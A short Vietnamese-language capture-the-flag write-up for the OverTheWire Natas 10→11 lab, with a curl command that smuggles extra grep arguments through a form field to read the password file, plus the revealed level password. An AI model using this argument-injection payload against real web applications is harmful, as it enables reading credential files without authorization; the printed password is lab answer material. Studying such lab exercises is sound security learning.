# Natas 10 → 11

## Mục tiêu

Vượt filter để đọc file qua grep.

## Tôi thấy

Filter chặn một số ký tự, nhưng vẫn cho input trở thành nhiều arguments của grep.

## Cách làm

```bash
curl -u natas10:<password> --get --data-urlencode "needle=.* /etc/natas_webpass/natas11 #" http://natas10.natas.labs.overthewire.org/
```

## Vì sao cách này hiệu quả

Regex `.*` khớp mọi dòng; pathname thứ hai khiến grep đọc file password.

## Kết quả

Password của `natas11`:

```text
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
```
